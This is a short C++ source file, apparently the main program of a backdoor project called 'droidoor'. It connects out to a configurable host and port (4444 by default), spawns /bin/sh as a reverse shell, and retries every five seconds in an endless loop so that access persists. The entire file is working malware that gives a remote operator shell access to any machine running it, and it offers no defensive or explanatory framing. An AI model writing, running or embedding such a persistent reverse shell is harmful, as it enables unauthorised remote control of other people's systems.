#ifndef TARGET_IP
    #define TARGET_IP "127.0.0.1"
#endif

#ifndef TARGET_PORT
    #define TARGET_PORT 4444
#endif

#include "src/droidoor/rshell.hpp"
#include <string>
#include <cstdint>
#include <iostream>
#include <unistd.h>

int main(){
    std::string ip = TARGET_IP;
    uint16_t port = TARGET_PORT;
    
    while (true) {
        try {
        droidoor::ReverseShell rshell(ip, port);
            rshell.setup_connect();
            rshell.spawn_shell(std::string("/bin/sh"));

        } catch (const std::exception& e){
            std::cerr << "Failed to commit: " << e.what() << std::endl;
        }
        sleep(5);

    }
    return 0;
}